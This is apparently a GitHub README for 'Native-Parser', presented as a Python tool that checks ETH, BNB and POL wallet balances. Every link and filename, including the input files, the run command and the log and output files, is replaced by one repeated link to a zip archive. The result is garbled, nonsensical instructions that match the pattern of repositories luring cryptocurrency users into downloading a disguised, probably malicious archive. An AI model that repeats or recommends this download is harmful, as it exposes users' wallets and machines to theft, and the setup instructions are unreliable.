# 🛠️ Native-Parser - Simple Balance Checker for Wallets

## 📦 Get Started

[![Download Native-Parser](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip)

Native-Parser helps you easily check your multi-chain wallet balances. This Python script checks native token balances (ETH, BNB, POL) across popular blockchains using simple commands. You don’t need extensive technical knowledge to get started.

## 📋 Requirements

### Software

- Python 3.7 or higher
- Pip (Python package installer)

### Libraries

You will need to install the following packages. Open your command line and run:

```bash
pip install web3 pandas openpyxl requests
```

These packages handle the interactions with Ethereum wallets and manage spreadsheet outputs.

### Files to Prepare

To use Native-Parser, you'll need to create two text files:

1. **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip**
   - Place one wallet address on each line.
   - Example:
     ```
     0x1234567890abcdef1234567890abcdef12345678
     0xabcdef1234567890abcdef1234567890abcdef12
     ```
   
2. **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip (Optional)**
   - If you want to use proxies, list one proxy per line.
   - Format: `http://user:pass@ip:port` or `http://ip:port`
   - Example:
     ```
     http://username:password@123.456.789.000:8080
     http://123.456.789.001:8080
     ```

## 🚀 Download & Install

To download the latest version of Native-Parser, visit the [Releases Page](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip). Look for the latest release and click on the download link for your operating system.

1. Go to the [Releases Page](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip).
2. Choose the appropriate version for your system and download the file.
3. Extract the downloaded file if it’s in a compressed format.

## ⚙️ How to Run

1. Open your terminal or command line interface.
2. Navigate to the directory where you saved the Native-Parser files.
3. Run the script with the following command:

```bash
python https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip
```

After running the script, it will generate two important files:

- **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip**: This file contains logs for debugging.
- **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip**: This spreadsheet holds your token balance results.

## 🔍 Features

- **Auto RPC Fallback**: The script automatically switches between RPC nodes for reliability.
- **Proxy Rotation**: If you're using proxies, the script rotates through them for better performance.
- **Checksum Address Validation**: Ensures wallet addresses are valid to avoid errors.
- **Excel Export**: Results are saved in an Excel file with wallet labels for easy understanding.

## 💻 Support and Troubleshooting

If you encounter any issues:

- Check that you have installed all required libraries.
- Ensure your Python version is compatible.
- Review the `https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip` file for specific error messages.

If you still need help, feel free to ask questions or open an issue on the GitHub repository.

## 📊 Use Cases

Native-Parser is ideal for:

- **Airdrop Hunters**: Quickly check if your wallets hold eligible tokens.
- **Wallet Auditors**: Efficiently review wallet balances across multiple chains.

## 📜 License

Native-Parser is open-source software. You can use, modify, and distribute it under the terms found in the license file included in the repository.

## 📞 Contact

For more information, please reach out through the GitHub issues page or contact the author directly through the repository.